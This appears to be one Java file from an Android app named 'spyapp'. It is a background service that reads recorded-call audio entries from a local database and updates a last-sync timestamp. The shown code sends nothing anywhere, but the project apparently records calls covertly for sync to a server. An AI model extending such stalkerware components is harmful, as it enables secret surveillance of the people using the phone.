package com.app.spyapp.servercall;

import android.app.IntentService;
import android.content.Intent;

import com.app.spyapp.SpyApp;
import com.app.spyapp.common.Const;
import com.app.spyapp.common.Pref;
import com.app.spyapp.model.AudioRecordModel;
import com.app.spyapp.model.BrowserModel;

import java.util.ArrayList;

/**
 * Created by Ankit on 6/5/2016.
 */
public class AudioRecordCallService extends IntentService {

    private SpyApp spyApp;

    public AudioRecordCallService() {
        super(AudioRecordCallService.class.getSimpleName());
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        spyApp = (SpyApp) getApplicationContext();
        ArrayList<AudioRecordModel> bookmarkList = spyApp.getDatabaseHelper().getAudioRecordList(spyApp.getSharedPreferences().getString(Pref.AUDIO_CALL_UPDATEDATE, Const.INITDATETIME));
        spyApp.getSharedPreferences().edit().putString(Pref.AUDIO_CALL_UPDATEDATE, spyApp.getDatabaseHelper().getMaxDateofAudioRecord()).apply();

    }
}
